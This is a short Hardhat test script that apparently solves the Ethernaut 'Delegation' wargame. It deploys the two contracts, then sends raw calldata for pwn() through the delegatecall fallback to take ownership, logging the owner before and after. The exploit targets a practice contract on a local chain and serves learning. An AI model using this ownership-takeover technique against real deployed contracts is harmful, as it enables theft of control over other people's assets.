const { expect } = require("chai");
const { ethers } = require("hardhat");
const { MaxUint256 } = require("@ethersproject/constants");
const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils");
describe("test", function () {
    var Delegation;
    var Delegate;
    it("init params", async function () {
        [deployer, ...users] = await ethers.getSigners();
    });
    it("deploy", async function () {
        const DelegateInstance = await ethers.getContractFactory("Delegate");
        Delegate = await DelegateInstance.deploy(users[0].address);

        const DelegationInstance = await ethers.getContractFactory("Delegation");
        Delegation = await DelegationInstance.deploy(Delegate.address);
    });
    it("hack test", async function () {
        console.log(await Delegation.owner());

        const abi = ["function pwn() external"];
        const interface = new ethers.utils.Interface(abi);

        const callData = interface.encodeFunctionData(`pwn`, []);
        await users[0].sendTransaction({
            to: Delegation.address,
            data: callData,
        });
        console.log(await Delegation.owner());
    });
});
